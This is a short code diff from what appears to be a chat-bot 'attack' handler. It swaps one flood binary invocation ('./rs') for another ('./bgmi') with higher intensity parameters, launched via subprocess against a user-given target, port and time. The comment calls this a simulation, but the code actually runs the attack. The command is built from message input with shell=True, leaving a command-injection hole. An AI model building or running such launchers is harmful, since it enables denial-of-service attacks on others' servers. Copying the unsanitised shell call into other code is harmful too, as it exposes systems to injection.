@@ -300,7 +300,7 @@ def handle_attack(message):
                     start_attack_reply(message, target, port, time)
 
                     # Simulate attack process
-                    full_command = f"./rs {target} {port} {time} 150"
+                    full_command = f"./bgmi {target} {port} {time} 300 1000"
                     subprocess.run(full_command, shell=True)
 
                     response = "attack completed successfully feedback doo."
